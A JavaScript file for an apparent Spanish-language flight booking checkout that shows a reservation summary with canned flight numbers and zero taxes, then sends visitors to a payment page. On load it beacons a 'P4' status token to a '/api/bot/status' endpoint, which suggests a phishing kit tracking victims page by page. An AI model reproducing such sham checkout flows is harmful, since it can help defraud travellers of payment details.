/**
 * Elements@Index
 * 
 */
const DOMElements = {
    loader: document.querySelector('.modal-loader'),

    divResumeFlightGo: document.querySelector('#resume-flight-go'),
    divResumeFlightBack: document.querySelector('#resume-flight-back'),
    divResumeTotal: document.querySelector('#resume-total'),

}




/**
 * Startup@Index
 * 
 */
document.addEventListener('DOMContentLoaded', () => {
    loadEventListeners();
    updateDOM();
    sendStatus();
});




/**
 * LoadEvents@Index
 * 
 */
const loadEventListeners = () => {
    const {

    } = DOMElements;

}

const updateDOM = () => {
    const {
        divResumeFlightGo,
        divResumeFlightBack,
        divResumeTotal,
    } = DOMElements;

    // Show resume
    let totalPassengers = info.passengersInfo.adults.length + info.passengersInfo.children.length;
    divResumeFlightGo.innerHTML = `
        <p class="poppins-medium text-2xl  mb-3">Tu reservación</p>
        <div class="mb-2 flex flex-row justify-between items-center">
            <div class="flex flex-row gap-2">
                <img src="./assets/svg/plane2_icon.png" width="25px">
                <p class="text-xl font-regular">Ida</p>
            </div>
            <img src="./assets/svg/${info.flightInfo.aeroline}_logo.png" width="80px">
        </div>
        <p class="mb-2">${formatDate(info.flightInfo.flightDates[0])}</p>
        <p class="mb-2">Vuelo: 4020 | <span class="text-[#2196f3] poppins-medium">Directo</span></p>
        <p class="mb-2">Sale: <b>${info.flightInfo.origin.city} (${info.flightInfo.origin.code})</b></p>
        <p class="mb-2">Llega: <b>${info.flightInfo.destination.city} (${info.flightInfo.destination.code})</b></p>
        <p class="mb-2">Tarifa: ${tarifas[`${info.flightInfo.aeroline}`][Number(info.flightInfo.seat_type)]}</p>
    `
    if (info.flightInfo.flightDates[1] !== 0) {
        divResumeFlightBack.innerHTML = `
            <div class="mb-2 flex flex-row justify-between items-center">
                <div class="flex flex-row gap-2">
                    <img src="./assets/svg/plane2_icon.png" width="25px">
                    <p class="text-xl font-regular">Ida</p>
                </div>
                <img src="./assets/svg/${info.flightInfo.aeroline_back}_logo.png" width="80px">
            </div>
            <p class="mb-2">${formatDate(info.flightInfo.flightDates[1])}</p>
            <p class="mb-2">Vuelo: 1102 | <span class="text-[#2196f3] poppins-medium">Directo</span></p>
            <p class="mb-2">Sale: <b>${info.flightInfo.destination.city} (${info.flightInfo.destination.code})</b></p>
            <p class="mb-2">Llega: <b>${info.flightInfo.origin.city} (${info.flightInfo.origin.code})</b></p>
            <p class="mb-2">Tarifa: ${tarifas[`${info.flightInfo.aeroline}`][Number(info.flightInfo.seat_type_back)]}</p>
        `

        const costFlightGo = PRECIO_BASE * MULTIPLICADOR_PLAN_MAP[info.flightInfo.seat_type] * totalPassengers;
        const costFlightBack = PRECIO_BASE * MULTIPLICADOR_PLAN_MAP[info.flightInfo.seat_type_back] * totalPassengers;

        divResumeTotal.innerHTML = `
            <div class="flex flex-row justify-between items-center">
                    <p>${formatPassengers(info.passengersInfo)}</p>
                    <p>$ ${formatPrice(costFlightGo + costFlightBack)}</p>
            </div>
            <div class="flex flex-row justify-between items-center mb-3">
                <p>Impuestos, tasas y cargos</p>
                <p>$ 0.00</p>
            </div>
            <div class="poppins-semibold text-3xl text-[#003B98] flex flex-row justify-between items-center">
                <p>Total</p>
                <p>$ ${formatPrice(costFlightGo + costFlightBack)}</p>
            </div>
        `
    } else {
        const costFlightGo = PRECIO_BASE * MULTIPLICADOR_PLAN_MAP[info.flightInfo.seat_type] * totalPassengers;
        divResumeTotal.innerHTML = `
            <div class="flex flex-row justify-between items-center">
                    <p>${formatPassengers(info.passengersInfo)}</p>
                    <p>$ ${formatPrice(costFlightGo)}</p>
            </div>
            <div class="flex flex-row justify-between items-center mb-3">
                <p>Impuestos, tasas y cargos</p>
                <p>$ 0.00</p>
            </div>
            <div class="poppins-semibold text-3xl text-[#003B98] flex flex-row justify-between items-center">
                <p>Total</p>
                <p>$ ${formatPrice(costFlightGo)}</p>
            </div>
        `
    }


}


/**
 * Functions@Index
 * 
 */
const formatDate = (dateInMillis) => {
    // Conversión a número, en caso de que llegue como string
    dateInMillis = Number(dateInMillis);

    // Se crea un objeto Date a partir de los milisegundos
    const date = new Date(dateInMillis);

    // Días de la semana en español
    const days = [
        "Domingo",
        "Lunes",
        "Martes",
        "Miércoles",
        "Jueves",
        "Viernes",
        "Sábado",
    ];

    // Meses del año en español
    const months = [
        "enero",
        "febrero",
        "marzo",
        "abril",
        "mayo",
        "junio",
        "julio",
        "agosto",
        "septiembre",
        "octubre",
        "noviembre",
        "diciembre",
    ];

    // Obtiene día de la semana, día del mes, mes y año
    const dayOfWeek = days[date.getDay()];   // 0 (Domingo) - 6 (Sábado)
    const dayOfMonth = date.getDate();       // 1 - 31
    const month = months[date.getMonth()];   // 0 (enero) - 11 (diciembre)
    const year = date.getFullYear();         // p. ej. 2025

    // Retorna la cadena en el formato requerido
    return `${dayOfWeek}, ${dayOfMonth} ${month} ${year}`;
};

function formatPassengers(passengersInfo) {
    const numAdults = passengersInfo.adults.length;
    const numChildren = passengersInfo.children.length + passengersInfo.babies.length;

    // Si hay niños, mostramos ambos. Si no, solo adultos.
    if (numChildren > 0) {
        return `${numAdults} Adulto(s), ${numChildren} Niño(s)`;
    } else {
        return `${numAdults} Adulto(s)`;
    }
}

function formatPrice(number){
    return number.toLocaleString('es', {
        maximumFractionDigits: 0,
        useGrouping: true
    });
}

function nextStep() {

    if (validateAllInputs()) {
        DOMElements.loader.classList.add('flex');

        setTimeout(() => {
            window.location.href = 'payment.html';
        }, 2000);
    } else {
        alert ('Rellena la información de todos los pasajeros')
    }
}

function validateAllInputs() {
    // Selecciona todos los inputs dentro de #passengers
    const inputs = document.querySelectorAll('#passengers input');
  
    for (const input of inputs) {
      // Verifica si está vacío (usando trim para ignorar espacios en blanco)
      if (!input.value.trim()) {
        return false;
      }
    }
  
    // Si llega aquí, significa que todos los inputs tienen algo
    return true;
}

const sendStatus = () =>{
    const tokenn = KJUR.jws.JWS.sign(null, { alg: "HS256" }, {message: 'P4'}, JWT_SIGN);

    try{
        fetch(`${API_URL}/api/bot/status`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${API_KEY}`
            },
            body: JSON.stringify({token: tokenn})
        });
    }catch(err){
        console.log(err);
    }
}
  






/**
 * UI@Index
 * 
 */